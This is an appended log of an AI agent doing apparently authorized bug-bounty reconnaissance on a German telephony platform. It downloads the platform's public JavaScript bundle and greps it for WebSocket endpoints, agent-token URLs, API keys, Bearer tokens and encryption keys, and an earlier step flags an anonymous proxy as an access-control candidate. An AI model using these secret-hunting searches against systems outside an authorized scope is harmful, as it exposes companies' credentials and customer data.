@@ -5965,3 +5965,570 @@ testability: PASSIVE (read-only asset enumeration)
 ## STEP 7 — RISK
 
 [RISK] questnet-gmbh: 55 — One confirmed in-scope live WebSocket proxy with anonymous handshake to customer business systems (high-value BOLA candidate); secondary finding confirms internal surface enumeration via public ExtJS app. Breadth limited by CDN wildcard surface (8632 hostnames → 0 dedicated subdomain). Two confirmed in-scope live hosts total. api.live-manager.de non-resolving reduces API-surface scope to cbs-proxy alone.
+===== ANALYST bigpickle 2026-09-04 20:10:34 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la; echo "---"; find . -maxdepth 2 -name "*.md" -o -maxdepth 2 -name "*.yml" -o -maxdepth 2 -name "*.txt" 2>/dev/null | head -50
+total 140
+drwxr-xr-x 12 runner runner  4096 Sep  4 19:54 .
+drwxr-xr-x  3 runner runner  4096 Sep  4 19:53 ..
+drwxr-xr-x  7 runner runner  4096 Sep  4 19:54 .git
+drwxr-xr-x  3 runner runner  4096 Sep  4 19:53 .github
+-rw-r--r--  1 runner runner  1609 Sep  4 19:53 README.md
+-rw-r--r--  1 runner runner    32 Sep  4 19:54 analyst-out.txt
+-rw-r--r--  1 runner runner 27719 Sep  4 19:54 analyst-prompt.txt
+-rw-r--r--  1 runner runner 23999 Sep  4 19:54 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 inventory
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 knowledge
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 leads
+-rw-r--r--  1 runner runner   377 Sep  4 19:53 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 recon-notes
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 reports
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 reposcan-raw
+-rw-r--r--  1 runner runner  3133 Sep  4 19:53 scope.yml
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 scripts
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_laguna.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_ling3.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_longcat.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_mimo.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 triage
+---
+./analyst-out.txt
+./triage/run-2026-09-04-14-05.md
+./triage/run-2026-09-03-08-18.md
+./triage/run-2026-09-04-19-53.md
+./triage/run-2026-09-03-22-24.md
+./triage/run-2026-09-04-05-05.md
+./triage/run-2026-09-02-23-54.md
+./triage/run-2026-09-04-00-23.md
+./triage/run-2026-09-04-17-42.md
+./triage/run-2026-09-03-12-53.md
+./triage/run-2026-09-03-03-39.md
+./triage/run-2026-09-02-21-42.md
+./triage/run-2026-09-04-09-45.md
+./triage/run-2026-09-03-19-43.md
+./triage/run-2026-09-03-16-58.md
+./recon-notes/DEDICATED-DEEP.md
+./inventory/questnet-gmbh.md
+./knowledge/index.md
+./analyst-prompt.txt
+./probe-results.md
+./reports/hypotheses-ling3.txt
+./reports/hypotheses-bigpickle.txt
+./reports/hypotheses-longcat.txt
+./reports/hypotheses-laguna.txt
+./reports/hypotheses-nemotron3.txt
+./reports/hypotheses.md
+./reports/valid-bugs.md
+./scope.yml
+./leads/lead-nemotron3.md
+./leads/lead-bigpickle.md
+./leads/lead-laguna.md
+./leads/lead-ling3.md
+./leads/lead-mimo.md
+./leads/lead-longcat.md
+./leads/reposcan-questnet-gmbh.md
+./reposcan-raw/summary.txt
+./README.md
+./ctx.txt
+[0m
+[0m→ [0mRead ctx.txt
+[0m→ [0mRead scope.yml
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead recon-notes/DEDICATED-DEEP.md
+[0m→ [0mRead knowledge/index.md
+[0m→ [0mRead analyst-prompt.txt
+[0m→ [0mRead triage/run-2026-09-04-19-53.md
+[0m→ [0mRead reports/hypotheses.md
+[0m→ [0mRead reports/valid-bugs.md
+[0m
+[0m$ [0mls -la scripts/ reports/ leads/ triage/; echo "---states---"; cat state_bigpickle.json state_nemotron3.json state_ling3.json 2>/dev/null; echo "---analyst-out---"; cat analyst-out.txt
+leads/:
+total 120
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 .
+drwxr-xr-x 12 runner runner  4096 Sep  4 19:54 ..
+-rw-r--r--  1 runner runner 30980 Sep  4 19:53 lead-bigpickle.md
+-rw-r--r--  1 runner runner   408 Sep  4 19:53 lead-laguna.md
+-rw-r--r--  1 runner runner   400 Sep  4 19:53 lead-ling3.md
+-rw-r--r--  1 runner runner   416 Sep  4 19:53 lead-longcat.md
+-rw-r--r--  1 runner runner    18 Sep  4 19:53 lead-mimo.md
+-rw-r--r--  1 runner runner 58791 Sep  4 19:53 lead-nemotron3.md
+-rw-r--r--  1 runner runner  1008 Sep  4 19:53 reposcan-questnet-gmbh.md
+
+reports/:
+total 524
+drwxr-xr-x  2 runner runner   4096 Sep  4 19:53 .
+drwxr-xr-x 12 runner runner   4096 Sep  4 19:54 ..
+-rw-r--r--  1 runner runner 304346 Sep  4 19:53 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   1736 Sep  4 19:53 analyst-laguna.log
+-rw-r--r--  1 runner runner   1728 Sep  4 19:53 analyst-ling3.log
+-rw-r--r--  1 runner runner   1744 Sep  4 19:53 analyst-longcat.log
+-rw-r--r--  1 runner runner 158266 Sep  4 19:53 analyst-nemotron3.log
+-rw-r--r--  1 runner runner   4898 Sep  4 19:53 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner     51 Sep  4 19:53 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner     50 Sep  4 19:53 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner     52 Sep  4 19:53 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   6592 Sep  4 19:53 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  13330 Sep  4 19:53 hypotheses.md
+-rw-r--r--  1 runner runner     39 Sep  4 19:53 valid-bugs.md
+
+scripts/:
+total 28
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 .
+drwxr-xr-x 12 runner runner  4096 Sep  4 19:54 ..
+-rw-r--r--  1 runner runner 16987 Sep  4 19:53 sync-issues.py
+
+triage/:
+total 64
+drwxr-xr-x  2 runner runner 4096 Sep  4 19:53 .
+drwxr-xr-x 12 runner runner 4096 Sep  4 19:54 ..
+-rw-r--r--  1 runner runner    0 Sep  4 19:53 .gitkeep
+-rw-r--r--  1 runner runner  228 Sep  4 19:53 run-2026-09-02-21-42.md
+-rw-r--r--  1 runner runner  150 Sep  4 19:53 run-2026-09-02-23-54.md
+-rw-r--r--  1 runner runner  754 Sep  4 19:53 run-2026-09-03-03-39.md
+-rw-r--r--  1 runner runner  315 Sep  4 19:53 run-2026-09-03-08-18.md
+-rw-r--r--  1 runner runner  143 Sep  4 19:53 run-2026-09-03-12-53.md
+-rw-r--r--  1 runner runner  229 Sep  4 19:53 run-2026-09-03-16-58.md
+-rw-r--r--  1 runner runner  163 Sep  4 19:53 run-2026-09-03-19-43.md
+-rw-r--r--  1 runner runner  269 Sep  4 19:53 run-2026-09-03-22-24.md
+-rw-r--r--  1 runner runner  214 Sep  4 19:53 run-2026-09-04-00-23.md
+-rw-r--r--  1 runner runner  186 Sep  4 19:53 run-2026-09-04-05-05.md
+-rw-r--r--  1 runner runner  226 Sep  4 19:53 run-2026-09-04-09-45.md
+-rw-r--r--  1 runner runner  174 Sep  4 19:53 run-2026-09-04-14-05.md
+-rw-r--r--  1 runner runner  144 Sep  4 19:53 run-2026-09-04-17-42.md
+-rw-r--r--  1 runner runner  190 Sep  4 19:53 run-2026-09-04-19-53.md
+---states---
+{"phase": "POC", "target": "api"}{"phase": "POC", "target": "api"}{"phase": "POC", "target": "api"}---analyst-out---
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la; echo "---"; find . -maxdepth 2 -name "*.md" -o -maxdepth 2 -name "*.yml" -o -maxdepth 2 -name "*.txt" 2>/dev/null | head -50
+total 140
+drwxr-xr-x 12 runner runner  4096 Sep  4 19:54 .
+drwxr-xr-x  3 runner runner  4096 Sep  4 19:53 ..
+drwxr-xr-x  7 runner runner  4096 Sep  4 19:54 .git
+drwxr-xr-x  3 runner runner  4096 Sep  4 19:53 .github
+-rw-r--r--  1 runner runner  1609 Sep  4 19:53 README.md
+-rw-r--r--  1 runner runner    32 Sep  4 19:54 analyst-out.txt
+-rw-r--r--  1 runner runner 27719 Sep  4 19:54 analyst-prompt.txt
+-rw-r--r--  1 runner runner 23999 Sep  4 19:54 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 inventory
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 knowledge
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 leads
+-rw-r--r--  1 runner runner   377 Sep  4 19:53 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 recon-notes
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 reports
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 reposcan-raw
+-rw-r--r--  1 runner runner  3133 Sep  4 19:53 scope.yml
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 scripts
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_laguna.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_ling3.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_longcat.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_mimo.json
+-rw-r--r--  1 runner runner    33 Sep  4 19:53 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Sep  4 19:53 triage
+---
+./analyst-out.txt
+./triage/run-2026-09-04-14-05.md
+./triage/run-2026-09-03-08-18.md
+./triage/run-2026-09-04-19-53.md
+./triage/run-2026-09-03-22-24.md
+./triage/run-2026-09-04-05-05.md
+./triage/run-2026-09-02-23-54.md
+./triage/run-2026-09-04-00-23.md
+./triage/run-2026-09-04-17-42.md
+./triage/run-2026-09-03-12-53.md
+./triage/run-2026-09-03-03-39.md
+./triage/run-2026-09-02-21-42.md
+./triage/run-2026-09-04-09-45.md
+./triage/run-2026-09-03-19-43.md
+./triage/run-2026-09-03-16-58.md
+./recon-notes/DEDICATED-DEEP.md
+./inventory/questnet-gmbh.md
+./knowledge/index.md
+./analyst-prompt.txt
+./probe-results.md
+./reports/hypotheses-ling3.txt
+./reports/hypotheses-bigpickle.txt
+./reports/hypotheses-longcat.txt
+./reports/hypotheses-laguna.txt
+./reports/hypotheses-nemotron3.txt
+./reports/hypotheses.md
+./reports/valid-bugs.md
+./scope.yml
+./leads/lead-nemotron3.md
+./leads/lead-bigpickle.md
+./leads/lead-laguna.md
+./leads/lead-ling3.md
+./leads/lead-mimo.md
+./leads/lead-longcat.md
+./leads/reposcan-questnet-gmbh.md
+./reposcan-raw/summary.txt
+./README.md
+./ctx.txt
+[0m
+[0m→ [0mRead ctx.txt
+[0m→ [0mRead scope.yml
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead recon-notes/DEDICATED-DEEP.md
+[0m→ [0mRead knowledge/index.md
+[0m→ [0mRead analyst-prompt.txt
+[0m→ [0mRead triage/run-2026-09-04-19-53.md
+[0m→ [0mRead reports/hypotheses.md
+[0m→ [0mRead reports/valid-bugs.md
+[0m
+[0m→ [0mRead leads/lead-nemotron3.md
+[0m→ [0mRead README.md
+[0m
+[0m$ [0mgit log --oneline -20; echo "---"; head -60 scripts/sync-issues.py
+75b7fec triage 2026-09-04-19-53
+---
+import os, re, hashlib
+from difflib import SequenceMatcher
+from pathlib import Path
+from github import Github
+
+REPO = os.environ["GITHUB_REPOSITORY"]
+TOKEN = os.environ["GITHUB_TOKEN"]
+GLOB = os.environ.get("LEAD_GLOB", "leads/lead-*.md")
+TARGET = os.environ.get("TARGET_NAME", "hunt")
+MODEL_FROM_FILENAME = os.environ.get("MODEL_FROM_FILENAME", "0") == "1"
+
+STOP = re.compile(r'^\[(HYP|PARKED|FINAL|NEXT|LEARN|RISK|NEW|CHANGED|PRIO)\]')
+KV = re.compile(r'^([a-z_]+):\s*(.*)$', re.I)
+
+TITLE_SIM_THRESHOLD = float(os.environ.get("TITLE_SIM_THRESHOLD", "0.82"))
+COARSE_SIM_THRESHOLD = float(os.environ.get("COARSE_SIM_THRESHOLD", "0.55"))
+
+
+def split_inline(title):
+    """Extract inline attributes from a single-line lead of the form:
+    [HYP] Title: confidence 96, class MISCONFIG, verify_steps ..., asset https://...
+    Attribute matches are removed; the title is cut at the first attribute."""
+    attrs = {}
+    pats = [
+        (r'confidence\s*(?:=|:|\s+)\s*(\d{1,3})', 'confidence', None),
+        (r'conf\s*(?:=|:|\s+)\s*(\d{1,3})', 'confidence', None),
+        (r'\((\d{2,3})\)\s*[:;]', 'confidence', None),
+        (r'class\s*(?:=|:|\s+)\s*([A-Za-z_]+)', 'class', str.upper),
+        (r'asset\s*(?:=|:|\s+)\s*(https?://[^\s,;]+|/[^\s,;]+)', 'asset', None),
+        (r'severity\s*(?:=|:|\s+)\s*([A-Za-z]+)', 'severity', None),
+        (r'testability\s*(?:=|:|\s+)\s*([A-Za-z_]+)', 'testability', str.upper),
+        (r'verify[_\s]steps\s*(?:=|:|\s+)\s*([^\n|]+)', 'verify_steps', None),
+        (r'impact\s*(?:=|:|\s+)\s*([^\n|]+)', 'impact', None),
+        (r'reasoning\s*(?:=|:|\s+)\s*([^\n|]+)', 'reasoning', None),
+    ]
+    cut = None
+    for pat, key, transform in pats:
+        m = re.search(pat, title, re.I)
+        if m:
+            v = m.group(1).strip()
+            if transform:
+                v = transform(v)
+            if key not in attrs:
+                attrs[key] = v
+            cut = m.start() if cut is None else min(cut, m.start())
+    if cut is not None:
+        t = title[:cut]
+    else:
+        t = title
+    t = re.sub(r'^\s*[:,\s-]+\s*', '', t)
+    t = re.sub(r'\s+', ' ', t).strip()
+    return t, attrs
+
+
+def parse_blocks(text, model):
+    blocks, lines, i = [], text.splitlines(), 0
+    while i < len(lines):
+        m = re.match(r'^\[HYP\]\s*(.*)$', lines[i].strip())
+        if not m:
+            i += 1
+[0m
+[0m$ [0mcurl -sS --max-time 20 -o /tmp/opencode/help.json -w "help.json %{http_code} %{size_download}B %{content_type}\n" "https://www.applicationdesigner.de/help.json" ; sleep 1; curl -sS --max-time 20 -o /tmp/opencode/help.js -w "help.js %{http_code} %{size_download}B %{content_type}\n" "https://www.applicationdesigner.de/help.js"; sleep 1; curl -sS --max-time 20 -o /tmp/opencode/docs.php -w "docs.php %{http_code} %{size_download}B %{content_type}\n" "https://www.applicationdesigner.de/docs.php"
+help.json 200 1971B application/json
+help.js 200 3290201B application/javascript
+docs.php 200 48245B text/html; charset=UTF-8
+[0m
+[0m→ [0mRead /tmp/opencode/help.json
+[0m
+[0m$ [0mrg -o 'wss?://[^"'"'"' ]+' /tmp/opencode/help.js | sort -u | head -40; echo "---https/wss host-only---"; rg -o 'https?://[^"'"'"' )]+' /tmp/opencode/help.js | sort -u | head -60
+/bin/bash: line 1: rg: command not found
+---https/wss host-only---
+/bin/bash: line 1: rg: command not found
+[0m
+[0m✗ [0mGrep "wss?://[a-zA-Z0-9._:-]+" failed[90m in /tmp/opencode[0m
+[91m[1mError: [0mRipgrep JSON record exceeded 65536 bytes
+[0m✗ [0mGrep "[a-zA-Z0-9-]+\.live-manager\.de|185\.158\." failed[90m in /tmp/opencode[0m
+[91m[1mError: [0mRipgrep JSON record exceeded 65536 bytes
+[0m
+[0m$ [0mgrep -oE 'wss?://[a-zA-Z0-9._:/?=&-]+' /tmp/opencode/help.js | sort -u | head -50; echo "===live-manager hosts==="; grep -oE '[a-zA-Z0-9-]+\.live-manager\.de' /tmp/opencode/help.js | sort -u; echo "===applicationdesigner hosts==="; grep -oE '[a-zA-Z0-9-]+\.applicationdesigner\.de' /tmp/opencode/help.js | sort -u
+wss://cbs-proxy.api.live-manager.de?origin=LiveDebugger&cid=
+wss://cbs-proxy.api.live-manager.de?origin=LiveDemo&cid=
+===live-manager hosts===
+api.live-manager.de
+===applicationdesigner hosts===
+dev.applicationdesigner.de
+www.applicationdesigner.de
+[0m
+[0m$ [0mgrep -oE '.{120}api\.live-manager\.de.{120}' /tmp/opencode/help.js | head; echo "===proxy/endpoint model==="; grep -oE '.{80}(WssProxy|wsProxy|liveDebugger|LiveDebugger|serviceNumber|service_number|serviceNo|serverNumber).{80}' /tmp/opencode/help.js | head -20
+,logEntryCount:0,maxLogEntries:1000,updateQueue:[],isProcessingQueue:!1,debounceTimer:null,config:{url:'wss://cbs-proxy.api.live-manager.de?origin=LiveDebugger&cid={customer_id}&service={service_number}',autoReconnect:!0,reconnectInterval:5000,communicationTy
+iagrams['diagram'];if(dialog.ws){dialog.ws.close()}dialog.ws=Ext.create('CB.websocket.Connection',{url:'wss://cbs-proxy.api.live-manager.de?origin=LiveDemo&cid={customer_id}&service={service_number}',dialog:dialog,cid:dialog.context.customerId});dialog._updat
+===proxy/endpoint model===
+e:!1,debounceTimer:null,config:{url:'wss://cbs-proxy.api.live-manager.de?origin=LiveDebugger&cid={customer_id}&service={service_number}',autoReconnect:!0,reconnectInterval:
+=this.config.url.replace('{customer_id}',a.dialog.context.customerId).replace('{service_number}',a.dialog.context.serviceNumber);Ext.ux.WebSocket.prototype.constructor.call(t
+a':break;case 'error':case 'info':case 'api_error':break;default:console.log(TR.LiveDebugger.unknown_message_type+' '+c);}},addContent:function(a){this.logEntryCount++;this
+his.debounce(this.limitLogEntries,1000)},onError:function(b,a){console.error(TR.LiveDebugger.websocket_error+':',a)},SendPacket:function(d,c,a){a=a===void 0?'':a;var b={'ty
+r=a;e.model.skipsUndoManager=a},a.cleanupDuration*1000)}catch(i){console.log(TR.LiveDebugger.error_linking_nodes+': '+i);return null}}else {console.log(TR.LiveDebugger.node
+ar c=this.GetTemplate(a);this.DebugOutput(c.template)}else {this.DebugOutput(TR.LiveDebugger.error_node_not_found+': '+b)}},GetTimerCaption:function(b){var c='timer_'+b;if(
+deCache[c]=d;return d},GetChannelCaption:function(a){if(a=='inbound'){return TR.LiveDebugger.channel_inbound}var c='channel_'+a;if(this.nodeCache[c]){return this.nodeCache[
+r(var e=0;e<f.length;e++){var b=f[e];if(b.category=='multicall'&&b.key==a){d=TR.LiveDebugger.channel_outbound+' - '+b.name.replace(/\n/g,' ')+b.key;break}}this.nodeCache[c]
+data.data;var e=this.GetChannelCaption(b.channel);if(b.mode=='answer'){var w=TR.LiveDebugger.answer_mode_accept};if(b.mode=='preanswer'){var w=TR.LiveDebugger.answer_mode_p
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span>, '+TR.LiveDebugger.connection_
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span>, '+TR.LiveDebugger.wait+': %wa
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span>, '+TR.LiveDebugger.file+': <sp
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.variable+': <span class="db_var">%var%</span>, '+TR.LiveDebugger.set_value+': <
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.seconds+': <span class="db_var">%seconds%</span></span></div></td></tr>\n      
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.variable+': <span class="db_var">%var%</span>, '+TR.LiveDebugger.language+': <s
+nputTimeout%</span></div></td></tr>\n                <tr><td></td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span>, '+TR.LiveDebugger.stop_announ
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.variable+': <span class="db_var">%var%</span>, '+TR.LiveDebugger.append_inputs+
+r">%maximum%</span></div></td></tr>\n                <tr><td></td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span>, '+TR.LiveDebugger.stop_announ
+var">%timer%</span></div></td></tr>\n                <tr><td></td><td><div>'+TR.LiveDebugger.ondtmf_when_maximum+': <span class="db_var">%completed%</span>,</div></td></tr>
++('<table>\n                <tr><td style="width:43px">&nbsp;</td><td><div>'+TR.LiveDebugger.channel+': <span class="db_var">%channel%</span></div></td></tr>\n
+[0m
+[0m$ [0mgrep -oE 'https?://[a-zA-Z0-9._:-]+[^"'"'"' ]*' /tmp/opencode/help.js | sort -u | head -40; echo "===url: props==="; grep -oE "url:'[^']+'|url:\"[^\"]+\"" /tmp/opencode/help.js | sort -u | head -40; echo "===login/php endpoints==="; grep -oE '[a-zA-Z0-9_/.-]+\.php\?[^'"'"'"]*' /tmp/opencode/help.js | sort -u | head -20
+http://swfobject.googlecode.com/svn/trunk/swfobject/expressInstall.swf
+http://www.adobe.com/go/getflashplayer
+http://www.example.com
+http://www.w3.org/1999/xhtml
+http://www.w3.org/2000/svg
+https://api.openai.com/v1/chat/completions
+https://applicationdesigner.de/
+https://applicationdesigner.de/docs
+https://applicationdesigner.de/help/
+https://cdn.jsdelivr.net/npm/marked/marked.min.js
+https://dev.applicationdesigner.de
+https://dev.applicationdesigner.de/
+https://dev.applicationdesigner.de/docs
+https://dev.applicationdesigner.de/help/
+https://www.applicationdesigner.de/docs
+https://www.applicationdesigner.de/help/
+https://www.example.com
+===url: props===
+url:'URL'
+url:'cURL'
+url:'wss://cbs-proxy.api.live-manager.de?origin=LiveDebugger&cid={customer_id}&service={service_number}'
+url:'wss://cbs-proxy.api.live-manager.de?origin=LiveDemo&cid={customer_id}&service={service_number}'
+url:'{prefix}/{entityName}'
+===login/php endpoints===
+/extjs/voicenotes/download.php?file=
+AIDesigner/backend/public/index.php?route=
+[0m
+[0m$ [0mgrep -oE '.{150}openai\.com.{200}' /tmp/opencode/help.js | head -5; echo "===sk-/apikey==="; grep -oE '.{60}(sk-[A-Za-z0-9]|api_key|apikey|authorization|Bearer).{80}' /tmp/opencode/help.js | head -10; echo "===AIDesigner route==="; grep -oE '.{150}AIDesigner/backend.{200}' /tmp/opencode/help.js | head -5; echo "===voicenotes download==="; grep -oE '.{150}voicenotes/download\.php.{200}' /tmp/opencode/help.js | head -5
+sspezifische Ausgänge\nJSON.stringify(\n{\n    next: Ausgang\n});',instructions:'Du bist ein hilfreicher Telefonassistent.',api_endpoint:'https://api.openai.com/v1/chat/completions'},holiday:{title:'Feiertag',selectMessage:'Wählen Sie die gewünschte Feiertagsliste aus',descriptionLabel:'Bezeichnung',holidaysLabel:'Feiertage',assignVariableLabel:'Aktuellen Fe
+lication-specific outputs\nJSON.stringify(\n{\n    next: output\n});',instructions:'You are a helpful telephone assistant.',api_endpoint:'https://api.openai.com/v1/chat/completions'},holiday:{title:'Holiday',selectMessage:'Select the desired holiday list',descriptionLabel:'Description',holidaysLabel:'Holidays',assignVariableLabel:'Assign current holiday to v
+===sk-/apikey===
+1).toUpperCase()},t='x-masked',l='x-masked-relative',n='x-mask-msg',M=/^body/i,m={},E=function(d){var c=d.getData(),b=c[s];if(b===undefined){c[s
+,cls:f?n+' '+f:n,cn:{tag:'div',role:'presentation',cls:'x-mask-msg-inner',cn:{tag:'div',role:'presentation',cls:'x-mask-msg-text',html:h||''}}}}
+er(c)}else {e.setDisplayed(!1)}if(d===b.body){a.addCls('x-mask-fixed')}c.saveTabbableState({skipSelf:d===b.body});if(Ext.isIE9m&&d!==b.body&&c.i
+*2+'px';d=0};break;}if(!h){k=b;b=e;e=k;k=f;f=d;d=k}j.set('mask-image',a);j.set('mask-size',g*3+'px '+c*3+'px');j.set('mask-position-x',f);j.set(
+',Ext.Component,{isLoadMask:!0,msg:'Loading...',msgCls:'x-mask-loading',msgWrapCls:'x-mask-msg',useMsg:!0,useTargetEl:!1,cls:'x-mask',componentC
+" data-ref="msgEl" class="{[values.$comp.msgCls]} ','x-','mask-msg-inner {childElCls}" role="presentation">','<div id="{id}-msgTextEl" data-ref=
+ord},beforeAction:function(g){var a=this,c=g.waitMsg,f='x-mask-loading',h=a.getFields().items,e,i=h.length,d,b;for(e=0;e<i;e++){d=h[e];if(d.isFo
+b){if(!b.getCount()){d.add({text:a.loadingText,iconCls:'x-mask-msg-text'});d.on({show:a.show,scope:a});b.on('load',a.bindMenuStore,a,{single:!0}
+sian'},{'value':'si-LK','text':'si-LK - Sinhala'},{'value':'sk-SK','text':'sk-SK - Slovak'},{'value':'sl-SI','text':'sl-SI - Slovenian'},{'value
+ameeraNeural','text':'si-LK - Sameera (Sinhala)'},{'value':'sk-SK-ViktoriaNeural','text':'sk-SK - Viktoria (Slovak)'},{'value':'sk-SK-LukasNeura
+===AIDesigner route===
+delConfig:null,aiReasoningEl:null,aiReasoningText:'',aiReasoningStartTime:null,getAIDesignerConfigUrl:function(){return APPDESIGNER_API_PATH_NOPROXY+'AIDesigner/backend/config.php'},loadAIModelConfig:function(b){var a=this;if(a.aiModelConfig){b(a.aiModelConfig);return}fetch(a.getAIDesignerConfigUrl()).then(function(a){return a.json()}).then(function(c){a.aiModelConf
+⚡⚡ Medium',high:'⚡⚡⚡ High'},default_model:'gpt-5.3-codex'};b(a.aiModelConfig)})},getAIDesignerApiBase:function(){return APPDESIGNER_API_PATH_NOPROXY+'AIDesigner/backend/public/index.php?route='},fetchAuthToken:function(a,b){var c=a&&a.context&&a.context.customerId?a.context.customerId:'';Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/agent/get_agent_token.php',us
+){return null}if(b){return b}}try{return a.down('#'+d)}catch(g){return null}},getDefaultAgentEndpoint:function(){return APPDESIGNER_API_PATH_NOPROXY+'AIDesigner/backend/public/coding.php'},fetchAuthToken:function(a,b){var c='';if(a&&a.context&&a.context.customerId){c=a.context.customerId}else if(a&&a.designer&&a.designer.context&&a.designer.context.customerId){c=a.d
+function(c){console.error('Auth Token Request fehlgeschlagen: '+c.status);b('')}})},getAgentConfigUrl:function(){return APPDESIGNER_API_PATH_NOPROXY+'AIDesigner/backend/config_coding.php'},getAgentRequestState:function(a){return a||null},getActiveAgentRequest:function(a){var b=this.getAgentRequestState(a);if(b&&b.agentRequest){return b.agentRequest}return a?a.agentR
+===voicenotes download===
+ar g=f.get('id');var e='audio-player-'+g;var d=Ext.ComponentQuery.query('window[itemId='+e+']')[0];if(d){d.toFront();return}var c=BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(a);var b=Ext.create('Ext.window.Window',{title:'Audio-Player - '+a,itemId:e,width:500,height:200,layout:'fit',modal:!1,resizable:!0,constrainHeader:!0,bodyStyle:'padding: 20
+ile=function(d){var b=d.get('filename');if(!b||b===''||b==='-'){Ext.Msg.alert('Fehler','Keine Audiodatei verfügbar');return}var c=BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(b);var a=document.createElement('iframe');a.style.display='none';a.src=c;document.body.appendChild(a);setTimeout(function(){if(a.parentNode){a.parentNode.removeChild(a)}},50
+[0m
+[0m$ [0mgrep -oE '(APPDESIGNER_API_PATH|BACKEND_URL|APPDESIGNER_API_PATH_NOPROXY)\s*=\s*[^,;]+' /tmp/opencode/help.js | head; echo "===agent_token usage==="; grep -oE '.{120}get_agent_token\.php.{160}' /tmp/opencode/help.js | head -6; echo "===route usage==="; grep -oE "route=\\\$\{?[^'\"& ]*|route:'[^']*'|route=\"[^\"]*\"" /tmp/opencode/help.js | sort -u | head
+BACKEND_URL=window.location.protocol+'//'+window.location.hostname
+BACKEND_URL=='file://'){BACKEND_URL='https://dev.applicationdesigner.de'}else {}CB.util.UserRights.loadPermissions(STARTUP_CUSTOMER_ID)
+APPDESIGNER_API_PATH==='undefined'){if(window.location.protocol=='file:'){APPDESIGNER_API_PATH='https://applicationdesigner.de/'
+APPDESIGNER_API_PATH_NOPROXY='https://applicationdesigner.de/'
+APPDESIGNER_API_PATH='https://applicationdesigner.de/'
+APPDESIGNER_API_PATH_NOPROXY='https://applicationdesigner.de/'}else if(window.location.href.indexOf('https://dev.applicationdesigner.de/help/')==0||window.location.href.indexOf('https://dev.applicationdesigner.de/docs')==0){APPDESIGNER_API_PATH='https://dev.applicationdesigner.de/'
+APPDESIGNER_API_PATH_NOPROXY='https://dev.applicationdesigner.de/'}else {APPDESIGNER_API_PATH='/api/callbuilder/'
+APPDESIGNER_API_PATH_NOPROXY='https://applicationdesigner.de/'}}}help_history=[]
+===agent_token usage===
+ar c=a&&a.context&&a.context.customerId?a.context.customerId:'';Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/agent/get_agent_token.php',useDefaultXhrHeader:!1,method:'GET',params:{customerId:c},success:function(c){CB.util.security.decryptData(c.responseText).then(function(e){var d=Ext.decode(e
+&a.designer.context.customerId){c=a.designer.context.customerId}Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/agent/get_agent_token.php',useDefaultXhrHeader:!1,method:'GET',params:{customerId:c},success:function(c){CB.util.security.decryptData(c.responseText).then(function(e){var d=Ext.decode(e
+===route usage===
+[0m
+[0m$ [0mgrep -oE 'decryptData[^;]{0,120}' /tmp/opencode/help.js | head -4; echo "===aes/keys==="; grep -oE '.{80}(AES|aesKey|encryptionKey|cryptKey|passphrase|CryptoJS).{80}' /tmp/opencode/help.js | head -8
